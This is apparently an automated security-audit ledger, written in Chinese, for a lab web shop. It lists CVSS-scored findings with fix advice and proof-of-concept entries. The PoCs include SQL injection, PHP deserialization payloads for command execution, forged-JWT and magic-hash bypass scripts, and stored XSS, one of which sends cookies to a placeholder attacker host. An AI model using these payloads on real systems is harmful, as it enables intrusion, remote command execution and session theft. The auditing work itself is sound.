| I | L | LIKE 拼接使注入点可扩展为其他语句影响 | lab30-shop/app/public/catalog/index.php:4-4 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| A | L | 注入可能导致数据库时间消耗 | lab30-shop/app/public/catalog/index.php:4-4 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |

评分、引用校验、自动验证和结论处置分别记录。


可复核 POC（是否执行以验证记录为准）：

````text
{'filename': 'sqli_catalog_q.txt', 'language': 'text', 'script': '请求：GET /catalog/index.php?q=%25%27%20OR%201%3D1%20--%20\n正常：GET /catalog/index.php?q=日常', 'instructions': "访问 /catalog/index.php?q=%' OR 1=1 -- 观察返回商品数与正常查询不同。", 'normal_input': 'q=日常', 'attack_input': "q=%' OR 1=1 -- ", 'expected_result': '注入时 WHERE 恒真，返回全部商品/共找到数量异常；正常搜索仅匹配。'}
````


### 台账 `a655017e26ba43df89f3fdd08639ec37`

- 会员备份恢复存在不安全反序列化可致命令执行（CVSS 3.1 Base 8.8 (high) · CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H，验证：rejected）
  来源 `8f6d8bba05894ccf857e26498ae3cfe9` / 修订 1
  证据：[{'path': 'lab30-shop/app/public/account/backup.php', 'start_line': 4, 'end_line': 6}, {'path': 'lab30-shop/app/src/backup.php', 'start_line': 1, 'end_line': 5}, {'path': 'lab30-shop/app/src/dispatch_job.php', 'start_line': 1, 'end_line': 5}, {'path': 'lab30-shop/app/public/ops/jobs.php', 'start_line': 3, 'end_line': 4}]
  结论：account/backup.php 第4行对 $_POST['backup'] 做 base64_decode 后在 第5行直接 unserialize，随后仅用 instanceof MemberBackup 校验。攻击者可提交任意已定义类的序列化对象；ops/jobs.php 的 DispatchJob::__wakeup（dispatch_job.php:4）会执行 shell_exec($this->command)，反序列化触发即形成对象注入导致的命令执行。
  输入：POST 参数 backup（base64 序列化对象）
  传播：$_POST['backup'] -> base64_decode -> unserialize -> 对象 __wakeup/shell_exec
  危险操作：unserialize 还原任意对象并触发 DispatchJob::__wakeup 的 shell_exec
  保护：仅有 check_csrf() 与 instanceof MemberBackup 校验，未能阻止携带恶意属性的序列化对象被实例化及 __wakeup 执行
  前提：['需已登录（require_user）并取得 CSRF token；攻击者已知 DispatchJob 类属性 command 可被控制']
  修复建议：改用白名单反序列化（allowed_classes => [MemberBackup::class]）或使用 JSON 恢复；移除不必要的 __wakeup 中的 shell 执行。

**CVSS 3.1 评分依据**

- 状态：已量化；来源：自动指标，宿主计算
- 评分版本：1；适用结论版本：1；引擎：cvss31-base-1
- 来源任务：1287aed9e8cb4ed28ed7fcc8bd8cb91b
- 来源 ZIP 快照：586b79b41f8e4f59be80f2a9b548902b
- 评分时间：2026-10-27T16:58:53.846382+00:00

| 指标 | 取值 | 判断依据 | 源码引用或人工假设 | 待补充事项 |
|---|---|---|---|---|
| AV | N | Web 可达 | lab30-shop/app/public/account/backup.php:3-5 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| AC | L | 构造序列化对象即可 | lab30-shop/app/public/account/backup.php:4-5 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| PR | L | 需登录用户 | lab30-shop/app/public/account/backup.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| UI | N | 攻击者自行提交 | lab30-shop/app/public/account/backup.php:3-5 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| S | U | 仍在本进程内执行 | lab30-shop/app/src/dispatch_job.php:4-4 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| C | H | shell_exec 可读取系统/机密 | lab30-shop/app/src/dispatch_job.php:4-4 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| I | H | 可执行任意系统命令 | lab30-shop/app/src/dispatch_job.php:4-4 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| A | H | 任意命令可破坏服务 | lab30-shop/app/src/dispatch_job.php:4-4 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |

评分、引用校验、自动验证和结论处置分别记录。


可复核 POC（是否执行以验证记录为准）：

````text
{'filename': 'unserialize_backup_poc.sh', 'language': 'bash', 'script': 'TOKEN=... # 登录后会话 CSRF\nB64=$(php -r \'class DispatchJob{public $command="id";} echo base64_encode(serialize(new DispatchJob()));\')\ncurl -s -b SHOPSESSID=... -X POST \'http://TARGET/account/backup.php\' --data-urlencode "backup=$B64" --data-urlencode "csrf=$TOKEN"', 'instructions': '需有效登录会话与 CSRF token；生成含 command 的 DispatchJob 序列化对象后提交。', 'normal_input': 'backup=<合法 MemberBackup base64>', 'attack_input': 'backup=<DispatchJob command=id base64>', 'expected_result': '攻击输入在 unserialize 时触发 __wakeup 执行命令并回显结果；正常输入仅更新资料。'}
````


### 台账 `0a74ebc83d204eb9bbafdf036e928c07`

- partner/portal.php 仅 base64 解析 JWT 载荷即信任 role=admin，任何匿名用户可伪造令牌读取全部订单结算数据（CVSS 3.1 Base 7.5 (high) · CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N，验证：verified）
  来源 `e84a02e0cb4744b9bd8b9795cfd78d17` / 修订 1
  证据：[{'path': 'lab30-shop/app/public/partner/portal.php', 'start_line': 1, 'end_line': 6}, {'path': 'lab30-shop/app/public/partner/token.php', 'start_line': 3, 'end_line': 5}, {'path': 'lab30-shop/app/src/bootstrap.php', 'start_line': 33, 'end_line': 40}]
  结论：portal.php 把 token 按 '.' 拆分为 3 段后，只对第 2 段做 base64 解码并 json_decode，然后直接判断 payload['role']==='admin'；完全没有校验签名 HMAC（member/token.php 中签发的 HS256 签名被忽略），也没有解密/比对 sub 与当前会话用户。攻击者自行构造 header.payload.signature，其中 payload 为 {"role":"admin"}，即可通过第 3 行判断。第 4 行随后 db()->query('SELECT order_no,total FROM orders') 无归属过滤地返回所有订单号与金额，第 5 行通过 JSON 接口输出，构成未授权访问与敏感信息泄露。该分支在 require_user 之前执行，匿名即可触发。
  输入：POST 参数 token（或 Cookie partner_token），完全由攻击者控制
  传播：portal.php:2 explode('.')+base64_decode 取 payload -> portal.php:3 判断 role -> portal.php:4-5 查询并输出全部订单
  危险操作：db()->query('SELECT order_no,total FROM orders') 全量读取并 json_response 输出
  保护：无：既不校验 HMAC 签名（hash_hmac 仅在 signing 端使用），也不校验令牌与当前登录用户的绑定；第 3 行判断先于任何 require_user
  前提：['无需登录、无需会话；只需能向 /partner/portal.php 发送 POST token']

**CVSS 3.1 评分依据**

- 状态：已量化；来源：自动指标，宿主计算
- 评分版本：1；适用结论版本：1；引擎：cvss31-base-1
- 来源任务：1287aed9e8cb4ed28ed7fcc8bd8cb91b
- 来源 ZIP 快照：586b79b41f8e4f59be80f2a9b548902b
- 评分时间：2026-10-27T16:59:43.729876+00:00

| 指标 | 取值 | 判断依据 | 源码引用或人工假设 | 待补充事项 |
|---|---|---|---|---|
| AV | N | 通过 HTTP 访问 /partner/portal.php | lab30-shop/app/public/partner/portal.php:2-5 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| AC | L | 构造 base64 JSON payload 即可，无需条件 | lab30-shop/app/public/partner/portal.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| PR | N | 第 2-3 行在任何 require_user 之前执行，匿名可达 | lab30-shop/app/public/partner/portal.php:2-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| UI | N | 攻击者自身发起请求即可 | lab30-shop/app/public/partner/portal.php:2-5 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| S | U | 仍在本应用授权模型内，仅绕过角色判断 | lab30-shop/app/public/partner/portal.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| C | H | 返回全部订单号与金额等结算数据 | lab30-shop/app/public/partner/portal.php:4-5 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| I | N | 只读查询，未修改数据 | lab30-shop/app/public/partner/portal.php:4-4 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| A | N | 无可用性影响 | lab30-shop/app/public/partner/portal.php:4-4 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |

评分、引用校验、自动验证和结论处置分别记录。


可复核 POC（是否执行以验证记录为准）：

````text
{'filename': 'portal_jwt_bypass.py', 'language': 'python', 'script': "import base64, json, urllib.request, urllib.parse\nb=lambda d: base64.urlsafe_b64encode(json.dumps(d,separators=(',',':')).encode()).rstrip(b'=').decode()\ntok=b({'alg':'HS256','typ':'JWT'})+'.'+b({'sub':1,'role':'admin','name':'x'})+'.forgedsig'\ndata=urllib.parse.urlencode({'token':tok}).encode()\nreq=urllib.request.Request('http://TARGET/partner/portal.php',data=data,headers={'Accept':'application/json'})\nprint(urllib.request.urlopen(req).read().decode())\n", 'instructions': '把 TARGET 换为部署地址；无需登录，直接 POST 伪造的三段令牌（payload role=admin，签名任意）。', 'normal_input': 'role=customer 的合法令牌或空 token', 'attack_input': 'header.payload.sig，其中 payload={"sub":1,"role":"admin"}，签名任意字符串', 'expected_result': '正常输入返回 403；伪造令牌返回 200 JSON，含 role=admin 与全部订单 order_no/total 列表'}
````

- partner/portal.php 不验证 JWT 签名即信任 payload.role，伪造 token 可绕过 admin 鉴权读取全部订单（CVSS 3.1 Base 7.5 (high) · CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N，验证：inconclusive）
  来源 `341c5551fb614c98b13a2e69dfd4d237` / 修订 1
  证据：[{'path': 'lab30-shop/app/public/partner/portal.php', 'start_line': 1, 'end_line': 6}, {'path': 'lab30-shop/app/public/partner/token.php', 'start_line': 3, 'end_line': 4}]
  结论：portal.php 第2行从 $_POST['token'] 或 $_COOKIE['partner_token'] 取 token，仅用 explode 拆开后 base64 解码第二部分作为 payload，第3行只检查 payload['role']==='admin'，完全没有用签名第三段或 settings 中的密钥校验 HMAC。攻击者构造任意 header.payload.signature 三段字符串（payload 内 role=admin），即可通过检查，第4行随后 SELECT 全部订单并返回，无需任何登录。
  输入：POST token 或 Cookie partner_token
  传播：$_POST['token']/$_COOKIE['partner_token'] -> explode('.') -> base64_decode 第二段 -> json_decode -> $payload['role'] 判定
  危险操作：无签名校验即依据客户端可控 payload 授予 admin 权限并返回全部订单数据
  保护：无；第3行仅比较 payload role，第4行直接查询所有订单
  前提：['无需登录，直接 POST token 到 /partner/portal.php（或带 Accept: application/json 获取 JSON 结果）']
  修复建议：使用 hash_hmac 对 header.payload 重新计算签名并与第三段 hash_equals 比较，验证失败即拒绝；不要仅信任 payload 内容。

**CVSS 3.1 评分依据**

- 状态：已量化；来源：自动指标，宿主计算
- 评分版本：1；适用结论版本：1；引擎：cvss31-base-1
- 来源任务：1287aed9e8cb4ed28ed7fcc8bd8cb91b
- 来源 ZIP 快照：586b79b41f8e4f59be80f2a9b548902b
- 评分时间：2026-10-27T17:03:53.698838+00:00

| 指标 | 取值 | 判断依据 | 源码引用或人工假设 | 待补充事项 |
|---|---|---|---|---|
| AV | N | HTTP 接口远程可达 | lab30-shop/app/public/partner/portal.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| AC | L | 只需构造三段字符串 | lab30-shop/app/public/partner/portal.php:2-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| PR | N | 无需任何账号 | lab30-shop/app/public/partner/portal.php:2-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| UI | N | 无需他人交互 | lab30-shop/app/public/partner/portal.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| S | U | 同一应用内权限提升 | lab30-shop/app/public/partner/portal.php:3-4 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| C | H | 泄露全部订单号与金额 | lab30-shop/app/public/partner/portal.php:4-5 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| I | N | 仅读取数据 | lab30-shop/app/public/partner/portal.php:4-4 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| A | N | 不影响可用性 | lab30-shop/app/public/partner/portal.php:4-4 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |

评分、引用校验、自动验证和结论处置分别记录。


可复核 POC（是否执行以验证记录为准）：

````text
{'filename': 'poc_portal_jwt.py', 'language': 'python', 'script': "import base64, json\nh=base64.urlsafe_b64encode(json.dumps({'alg':'HS256','typ':'JWT'}).encode()).rstrip(b'=').decode()\np=base64.urlsafe_b64encode(json.dumps({'sub':1,'role':'admin'}).encode()).rstrip(b'=').decode()\nprint(h+'.'+p+'.fakesig')\n", 'instructions': '将输出的 token 以 POST token=<token> 提交到 /partner/portal.php，或设置 Cookie partner_token=<token> 后访问。', 'normal_input': 'token 为普通会员（role=standard）的真实凭证', 'attack_input': 'token 为 header 段 base64({"alg":"HS256","typ":"JWT"}) + payload 段 base64({"role":"admin"}) + 任意第三段', 'expected_result': '正常会员 token 返回 403，伪造 role=admin 的 token 返回全部订单结算列表。'}
````


### 台账 `e0cf553e9838411fa31a2455b8d0dd8d`

- account/redeem.php 使用 md5(token)==md5('240610708') 的 == 松散比较，任意 md5 为 0e 前缀的字符串即可免费升级金卡会员（CVSS 3.1 Base 4.3 (medium) · CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N，验证：inconclusive）
  来源 `210c381fae654f45b01d31154cdf1251` / 修订 1
  证据：[{'path': 'lab30-shop/app/public/account/redeem.php', 'start_line': 1, 'end_line': 9}, {'path': 'lab30-shop/app/src/bootstrap.php', 'start_line': 33, 'end_line': 40}]
  结论：redeem.php 第 4 行把兑换码做 md5 后与常量 md5('240610708')（值 0e462097431906509019562988736854）用 == 比较。第 5 行的 md5(...) 结果为 '0e...' 形式的字符串，PHP 松散比较会把两个 '0e' 开头纯数字字符串都当作 0 处理，于是任何 md5 结果形如 0e+纯数字 的输入（如已知经典值 240610708、QNKCDZO）都被判定相等。命中后执行 UPDATE users SET tier='gold'，普通用户无需真实兑换码即可获得金卡会员权益。兑换入口虽要求登录并有 CSRF token，但同会话用户可自行提供 token 值触发。
  输入：POST 参数 token，由已登录普通用户控制
  传播：redeem.php:4 md5(token) == 常量 0e 哈希 -> redeem.php:5 命中后 UPDATE tier='gold'
  危险操作：db()->prepare("UPDATE users SET tier='gold' WHERE id=?")->execute([$u['id']])
  保护：第 4 行 check_csrf() 仅防跨站伪造提交，无法阻止会话内选择 magic hash；比较使用松散 ==，且 md5 无盐存储，均可被绕过
  前提：['已登录普通账户，并能获取自己会话中的 CSRF token（页面表单直接提供）']

**CVSS 3.1 评分依据**

- 状态：已量化；来源：自动指标，宿主计算
- 评分版本：1；适用结论版本：1；引擎：cvss31-base-1
- 来源任务：1287aed9e8cb4ed28ed7fcc8bd8cb91b
- 来源 ZIP 快照：586b79b41f8e4f59be80f2a9b548902b
- 评分时间：2026-10-27T16:59:43.730862+00:00

| 指标 | 取值 | 判断依据 | 源码引用或人工假设 | 待补充事项 |
|---|---|---|---|---|
| AV | N | HTTP 访问 /account/redeem.php | lab30-shop/app/public/account/redeem.php:3-5 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| AC | L | 使用公开的 0e 哈希前缀字符串即可稳定命中 | lab30-shop/app/public/account/redeem.php:4-5 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| PR | L | $u=require_user() 要求已登录普通账户 | lab30-shop/app/public/account/redeem.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| UI | N | 攻击者提交自己的会话表单即可 | lab30-shop/app/public/account/redeem.php:3-5 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| S | U | 仅影响自身账户会员等级 | lab30-shop/app/public/account/redeem.php:5-5 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| C | N | 未泄露数据 | lab30-shop/app/public/account/redeem.php:5-5 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| I | L | 修改自身 users.tier 为 gold | lab30-shop/app/public/account/redeem.php:5-5 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| A | N | 无可用性影响 | lab30-shop/app/public/account/redeem.php:5-5 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |

评分、引用校验、自动验证和结论处置分别记录。


可复核 POC（是否执行以验证记录为准）：

````text
{'filename': 'redeem_magic_hash.sh', 'language': 'bash', 'script': '#!/bin/sh\n# 1) 登录拿会话 Cookie 与 csrf\ncurl -s -c c.txt -b c.txt -X POST http://TARGET/auth/login.php -d \'username=alice&password=Alice123!\'\nCSRF=$(curl -s -b c.txt http://TARGET/account/redeem.php | grep -o \'name="csrf" value="[^"]*\' | sed \'s/.*value="//\')\n# 2) 提交 md5 为 0e 前缀的兑换码\ncurl -s -b c.txt -H \'Accept: application/json\' -X POST http://TARGET/account/redeem.php -d "csrf=$CSRF&token=240610708"\n', 'instructions': '替换 TARGET 与登录口令；先用正常错误兑换码验证返回 422，再用 240610708（md5=0e462097431906509019562988736854）验证 accepted=true。', 'normal_input': 'token=wrongcode', 'attack_input': 'token=240610708', 'expected_result': '正常输入返回 422 且 tier 不变；攻击输入返回 200 {accepted:true}，users.tier 变为 gold'}
````


### 台账 `a403db352e9046b78830de823311d99f`

- 运营任务导入接口反序列化 DispatchJob 触发 shell_exec 命令执行（CVSS 3.1 Base 8.8 (high) · CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H，验证：inconclusive）
  来源 `c0bac5ca80b24fb9aeb3e41c495f07d9` / 修订 1
  证据：[{'path': 'lab30-shop/app/public/ops/jobs.php', 'start_line': 3, 'end_line': 3}, {'path': 'lab30-shop/app/src/dispatch_job.php', 'start_line': 2, 'end_line': 5}, {'path': 'lab30-shop/app/src/bootstrap.php', 'start_line': 33, 'end_line': 36}, {'path': 'lab30-shop/app/src/bootstrap.php', 'start_line': 40, 'end_line': 40}]
  结论：ops/jobs.php 第3行把 POST 的 job 做 base64_decode 后直接 unserialize，开发者接管的 DispatchJob 类在 src/dispatch_job.php 第4行的 __wakeup 中执行 echo shell_exec($this->command)。unserialize 在 instanceof 校验之前就已触发 __wakeup，因此攻击者可构造 O:12:"DispatchJob":1:{s:7:"command";s:N:"...";} 的 base64 载荷，使任意系统命令以 Web 进程权限执行，输出甚至被写回 jobs 表 details 字段。
  输入：POST 参数 job（base64 编码的序列化对象），攻击者需通过 check_csrf 校验（自己的会话可获取 csrf token）
  传播：jobs.php:3 $_POST['job'] -> base64_decode -> unserialize($raw) -> DispatchJob::__wakeup() -> shell_exec($this->command)
  危险操作：shell_exec 执行攻击者指定的系统命令
  保护：仅 check_csrf 与 require_user(['operator','admin'])；instanceof 校验在 unserialize 之后，无法阻止 __wakeup 执行；无 allowed_classes 限制
  前提：['攻击者需持有 operator 或 admin 角色的有效会话及对应 CSRF token；若可结合 mass_assignment/鉴权绕过则普通会员亦可']
  修复建议：禁止 unserialize 不可信输入；改用 JSON/白名单结构；给 unserialize 加 ['allowed_classes'=>false] 或移除 __wakeup 中的 shell_exec；命令参数固定并转义。

**CVSS 3.1 评分依据**

- 状态：已量化；来源：自动指标，宿主计算
- 评分版本：1；适用结论版本：1；引擎：cvss31-base-1
- 来源任务：1287aed9e8cb4ed28ed7fcc8bd8cb91b
- 来源 ZIP 快照：586b79b41f8e4f59be80f2a9b548902b
- 评分时间：2026-10-27T17:00:24.701377+00:00

| 指标 | 取值 | 判断依据 | 源码引用或人工假设 | 待补充事项 |
|---|---|---|---|---|
| AV | N | Web 入口远程可利用 | lab30-shop/app/public/ops/jobs.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| AC | L | 构造固定序列化字符串即可，无需特殊条件 | lab30-shop/app/src/dispatch_job.php:4-4 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| PR | L | 需要 operator/admin 会话，但页面内置示例 token 可由自助获取 csrf | lab30-shop/app/public/ops/jobs.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| UI | N | 攻击者自行提交请求 | lab30-shop/app/public/ops/jobs.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| S | U | 命令在应用自身进程上下文执行 | lab30-shop/app/src/dispatch_job.php:4-4 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| C | H | 任意命令可读取服务器全部文件与配置 | lab30-shop/app/src/dispatch_job.php:4-4 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| I | H | 可任意写入/篡改数据库与文件 | lab30-shop/app/src/dispatch_job.php:4-4 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| A | H | 可终止服务进程 | lab30-shop/app/src/dispatch_job.php:4-4 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |

评分、引用校验、自动验证和结论处置分别记录。


可复核 POC（是否执行以验证记录为准）：

````text
{'filename': 'poc_jobs_rce.php', 'language': 'php', 'script': '<?php\n// 以 operator 身份（已登录并持有 CSRF token）\n$cmd = "id";\n$obj = \'O:12:"DispatchJob":1:{s:7:"command";s:\' . strlen($cmd) . \':"\' . $cmd . \'";}\';\necho base64_encode($obj);\n', 'instructions': '1) 以 operator 登录并获取 /ops/jobs.php 页面中的 csrf token；2) 运行脚本生成载荷 base64；3) 向 POST /ops/jobs.php 提交 csrf=<token>&job=<base64>；4) 观察响应 <pre> 中返回 id 命令输出。', 'normal_input': 'job = base64(\'O:12:"DispatchJob":1:{s:7:"command";s:21:"printf inventory-ready";}\')', 'attack_input': 'job = base64(\'O:12:"DispatchJob":1:{s:7:"command";s:2:"id";}\')', 'expected_result': '正常输入显示 inventory-ready；攻击输入显示 uid/gid 信息，证明任意命令执行'}
````


### 台账 `35cb594a16274ac79907a659717056d0`

- 留言内容未转义导致存储型 XSS（CVSS 3.1 Base 4.6 (medium) · CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:L/I:L/A:N，验证：verified）
  来源 `7f1ad45ccae7497e8b6b2f4bee4c0ed2` / 修订 1
  证据：[{'path': 'lab30-shop/app/public/support/messages.php', 'start_line': 2, 'end_line': 5}]
  结论：support/messages.php 第3行把用户提交的 message 写入 messages 表，第5行遍历输出时直接 echo $row['message']，未调用 h() 转义，其他用户查看留言页即执行攻击者注入的 HTML/JS。
  输入：POST 参数 message
  传播：$_POST['message'] -> INSERT messages -> SELECT rows -> echo $row['message']
  危险操作：echo '<div class="message-body">'.$row['message'].'</div>'
  保护：display_name、created_at 使用了 h()，但 message 未转义。
  前提：['攻击者需登录账户（require_user）并具备有效 CSRF token 提交留言。']
  修复建议：输出留言时使用 h($row['message']) 转义，或在渲染前进行安全 HTML 白名单过滤。

**CVSS 3.1 评分依据**

- 状态：已量化；来源：自动指标，宿主计算
- 评分版本：1；适用结论版本：1；引擎：cvss31-base-1
- 来源任务：1287aed9e8cb4ed28ed7fcc8bd8cb91b
- 来源 ZIP 快照：586b79b41f8e4f59be80f2a9b548902b
- 评分时间：2026-10-27T17:01:05.211381+00:00

| 指标 | 取值 | 判断依据 | 源码引用或人工假设 | 待补充事项 |
|---|---|---|---|---|
| AV | N | Web 可远程访问 | lab30-shop/app/public/support/messages.php:2-5 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| AC | L | 提交带 HTML/JS 的留言即可 | lab30-shop/app/public/support/messages.php:3-5 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| PR | L | 需登录用户（require_user） | lab30-shop/app/public/support/messages.php:2-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| UI | R | 需其他用户浏览留言列表触发 | lab30-shop/app/public/support/messages.php:4-5 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| S | U | 影响浏览器渲染上下文 | lab30-shop/app/public/support/messages.php:5-5 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| C | L | 可读取页面可见信息/cookie 非 HttpOnly 情况 | lab30-shop/app/public/support/messages.php:5-5 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| I | L | 可在受害者会话中执行脚本操作 | lab30-shop/app/public/support/messages.php:5-5 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| A | N | 无持久数据破坏证据 | lab30-shop/app/public/support/messages.php:5-5 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |

评分、引用校验、自动验证和结论处置分别记录。


可复核 POC（是否执行以验证记录为准）：

````text
{'filename': 'stored_xss_message.txt', 'language': 'text', 'script': 'POST /support/messages.php\nmessage=<img src=x onerror=alert(document.domain)>', 'instructions': '登录后提交上述留言，再打开 /support/messages.php 查看列表。', 'normal_input': 'message=你好，请问配送时间？', 'attack_input': 'message=<img src=x onerror=alert(document.domain)>', 'expected_result': '正常留言显示为纯文本；攻击留言在留言列表中触发 img onerror 脚本执行。'}
````

- support/messages.php 留言未经转义输出导致存储型 XSS（CVSS 3.1 Base 4.6 (medium) · CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:L/I:L/A:N，验证：verified）
  来源 `f58b27eadd864c7e9b3e557e2474bd30` / 修订 1
  证据：[{'path': 'lab30-shop/app/public/support/messages.php', 'start_line': 3, 'end_line': 5}, {'path': 'lab30-shop/app/src/bootstrap.php', 'start_line': 10, 'end_line': 10}]
  结论：第3行把用户 POST message 原样存入 messages 表；第5行在渲染时把 $row['message'] 直接拼进 <div class="message-body">，未经过 h()（同处 display_name/created_at 都有 h()）。任意登录用户提交 <script> 即持久化 XSS，所有查看留言页的用户受影响。
  输入：POST message（已登录用户）
  传播：$_POST['message'] -> INSERT messages -> SELECT 回读 -> 直接 echo
  危险操作：未转义 HTML 输出到共享页面
  保护：无：存储与输出均未编码
  前提：['登录后访问 /support/messages.php 提交留言']
  修复建议：输出时使用 h($row['message'])

**CVSS 3.1 评分依据**

- 状态：已量化；来源：自动指标，宿主计算
- 评分版本：1；适用结论版本：1；引擎：cvss31-base-1
- 来源任务：1287aed9e8cb4ed28ed7fcc8bd8cb91b
- 来源 ZIP 快照：586b79b41f8e4f59be80f2a9b548902b
- 评分时间：2026-10-27T17:06:23.907620+00:00

| 指标 | 取值 | 判断依据 | 源码引用或人工假设 | 待补充事项 |
|---|---|---|---|---|
| AV | N | 远程 Web | lab30-shop/app/public/support/messages.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| AC | L | 直接提交脚本 | lab30-shop/app/public/support/messages.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| PR | L | 需登录账户 | lab30-shop/app/public/support/messages.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| UI | R | 受害者需查看留言页 | lab30-shop/app/public/support/messages.php:5-5 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| S | U | 同一来源 | lab30-shop/app/public/support/messages.php:5-5 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| C | L | 可读取会话/令牌 | lab30-shop/app/src/bootstrap.php:38-39 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| I | L | 可在受害者浏览器发起操作 | lab30-shop/app/public/support/messages.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| A | N | 无破坏证据 | lab30-shop/app/public/support/messages.php:5-5 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |

评分、引用校验、自动验证和结论处置分别记录。


可复核 POC（是否执行以验证记录为准）：

````text
{'filename': 'xss_messages.txt', 'language': 'text', 'script': "POST /support/messages.php\ncsrf=<token>&message=<script>fetch('//attacker/'+document.cookie)</script>", 'instructions': '登录后提交该留言，再以另一账户打开留言页观察脚本执行', 'normal_input': 'message=你好', 'attack_input': 'message=<script>alert(1)</script>', 'expected_result': '攻击输入渲染为可执行脚本，正常输入为文本'}
````


### 台账 `80274004de1940aca99c6bbc65dfb6e9`

- ops/jobs.php 对用户提供的 base64 数据直接 unserialize，DispatchJob::__wakeup 执行 shell_exec 形成命令执行（CVSS 3.1 Base 8.8 (high) · CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H，验证：rejected）
  来源 `4d6e65a1e99c4c2cb46c05f4da087cdf` / 修订 1
  证据：[{'path': 'lab30-shop/app/public/ops/jobs.php', 'start_line': 1, 'end_line': 5}, {'path': 'lab30-shop/app/src/dispatch_job.php', 'start_line': 1, 'end_line': 5}, {'path': 'lab30-shop/app/src/bootstrap.php', 'start_line': 33, 'end_line': 40}]
  结论：ops/jobs.php 第3行从 $_POST['job'] 取 base64 解码后直接 unserialize($raw)，且在执行完 unserialize 之后才检查 $job instanceof DispatchJob。src/dispatch_job.php 第4行的 __wakeup 会 shell_exec($this->command)，command 是 public 可控属性。因此攻击者提交序列化的 DispatchJob（command 为任意系统命令）即可在反序列化触发 __wakeup 时执行系统命令。check_csrf 仅防跨站，不限制命令内容；require_user(['operator','admin']) 仅要求运营/管理员账号。
  输入：POST 参数 job（base64 编码的序列化对象）
  传播：$_POST['job'] -> base64_decode -> unserialize -> DispatchJob::__wakeup -> shell_exec($this->command)
  危险操作：shell_exec 执行攻击者控制的命令字符串
  保护：check_csrf 仅校验 CSRF token；require_user(['operator','admin']) 仅做角色校验；instanceof 检查在执行之后，无法阻止 __wakeup 触发
  前提：['已登录 operator 或 admin 账号并持有有效 CSRF token']
  修复建议：禁止反序列化不可信数据，改用 JSON 等无副作用格式；如需反序列化则使用 allowed_classes 白名单，并移除 __wakeup 中的命令执行。

**CVSS 3.1 评分依据**

- 状态：已量化；来源：自动指标，宿主计算
- 评分版本：1；适用结论版本：1；引擎：cvss31-base-1
- 来源任务：1287aed9e8cb4ed28ed7fcc8bd8cb91b
- 来源 ZIP 快照：586b79b41f8e4f59be80f2a9b548902b
- 评分时间：2026-10-27T17:03:53.697830+00:00

